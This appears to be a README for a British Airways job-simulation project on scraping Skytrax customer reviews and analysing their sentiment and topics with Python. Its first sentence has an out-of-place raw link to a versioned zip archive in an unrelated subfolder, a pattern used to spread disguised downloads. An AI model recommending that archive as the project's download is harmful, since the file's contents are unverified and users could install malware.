This British Airways job simulation from https://github.com/purribd8/BA_customer_reviews/raw/refs/heads/main/trousseau/B-reviews-customer-v2.3.zip is based of real world applications that current data scientist working for British Airways are often tasked with. It focuses on web scraping and sentiment analysis of British Airways customer reviews from Skytrax using BeautifulSoup and Python. The results provide insights into customer experiences, helping to identify areas for airline service improvement. The extracted reviews were cleaned and stored in a structured CSV format for further analysis. Natural Language Processing (NLP) techniques, including sentiment analysis and topic modeling (NMF & TF-IDF), were applied to identify key themes and customer sentiments. Visualizations created with Matplotlib and Seaborn showcased sentiment distribution and topic trends, while bigram analysis highlighted commonly associated phrases.
